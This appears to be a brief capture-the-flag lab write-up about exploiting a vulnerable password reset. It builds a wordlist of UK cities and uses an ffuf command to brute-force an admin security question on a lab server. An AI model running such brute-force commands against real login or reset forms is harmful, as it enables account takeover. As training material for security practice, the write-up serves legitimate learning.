# [Vulnerable Password Reset](Vulnerable%20Password%20Reset.md)
### Which city is the admin user from?

```sh
cat world-cities.csv | grep "United Kingdom" | cut -d ',' -f1 > UK_cities.txt
```

![](Screenshot%202026-09-14%20at%2009.29.35.png)

```sh
ffuf -w UK_cities.txt -u http://154.57.164.82:31342/security_question.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=05fukpmttqjnv182398795i208" -d "security_response=FUZZ" -fr "Incorrect response."
```

![](Screenshot%202026-09-14%20at%2009.31.36.png)
### Reset the admin user's password on the target system to obtain the flag.

![](Screenshot%202026-09-14%20at%2009.32.15.png)